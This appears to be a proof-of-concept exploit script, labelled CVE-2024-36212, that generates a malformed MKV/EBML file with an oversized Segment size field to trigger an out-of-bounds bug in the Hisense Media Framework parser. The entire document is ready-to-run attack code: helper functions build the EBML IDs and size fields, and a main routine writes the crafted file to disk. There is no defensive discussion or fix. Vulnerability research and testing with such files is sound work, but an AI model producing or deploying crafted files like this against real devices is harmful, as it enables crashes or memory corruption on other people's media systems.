#!/usr/bin/env python3
"""CVE-2024-36212 — Hisense Media Framework. MKV/EBML with an oversized
Segment size field -> parser OOB."""
import struct, sys
from pathlib import Path

def _ebml_id(i: int) -> bytes:
    out = b""
    while i:
        out = bytes([i & 0xFF]) + out; i >>= 8
    return out

def _vint(n: int) -> bytes:
    # 8-byte size VINT with the leading length marker
    return b"\x01" + struct.pack(">Q", n)[1:]

def build() -> bytes:
    header = _ebml_id(0x1A45DFA3) + _vint(0)      # EBML header, size 0
    seg = _ebml_id(0x18538067) + _vint(0xFFFFFFFFFFFFFFFF)  # Segment, absurd size
    seg += _ebml_id(0x114D9B74) + _vint(0)        # SeekHead, size 0
    return header + seg

def main():
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2024-36212.mkv")
    d = build(); out.write_bytes(d)
    print(f"[+] CVE-2024-36212 MKV -> {out} ({len(d)} bytes)")

if __name__ == "__main__":
    main()
